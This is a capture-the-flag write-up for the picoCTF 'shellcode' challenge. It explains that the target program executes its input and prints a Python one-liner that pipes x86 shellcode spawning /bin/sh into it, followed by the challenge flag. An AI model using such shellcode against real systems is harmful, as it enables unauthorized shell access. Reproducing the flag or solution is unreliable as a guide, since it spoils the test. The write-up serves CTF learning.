> shellcode - Points: 200 - (Solves: 256)
> This program executes any input you give it. Can you get a shell? You can find the program in /problems/shellcode_4_99838609970da2f5f6cf39d6d9ed57cd on the shell server. Source.

By looking at the source we see that the program simply takes input and executes it. Which means we can pass arbitrary shell input which will be executed by the program.

Hence we pass in shellcode and let the program execute it and gives us a shell back.

Note: we need the `cat -` in this case so that we're able to access the shell after the program ends.
```
(python -c 'print "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43" + "\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80" + "\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"'; cat - ) | ./vuln
```

Once we get our shell we simply cat the flag to print it.
`cat flag.txt`

Flag: `picoCTF{shellc0de_w00h00_b766002c}`
